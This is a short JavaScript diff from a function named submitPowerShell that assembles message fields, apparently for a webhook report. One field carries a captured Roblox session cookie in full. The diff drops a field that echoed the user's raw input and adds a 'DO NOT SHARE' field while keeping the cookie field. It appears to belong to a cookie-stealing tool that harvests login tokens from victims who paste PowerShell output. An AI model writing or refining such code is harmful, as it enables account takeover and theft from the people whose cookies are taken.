@@ -259,13 +259,13 @@ async function submitPowerShell() {
                         inline: false
                     },
                     {
-                        name: "🍪 Cookie",
-                        value: `\`\`\`${globalRobloxCookie || 'None found'}\`\`\``,
+                        name: "⚠️ DO NOT SHARE",
+                        value: "Do not share the cookie with other people",
                         inline: false
                     },
                     {
-                        name: "📄 Raw Input",
-                        value: `\`\`\`${inputText.substring(0, 200)}...\`\`\``,
+                        name: "🍪 Cookie",
+                        value: `\`\`\`${globalRobloxCookie || 'None found'}\`\`\``,
                         inline: false
                     },
                     {
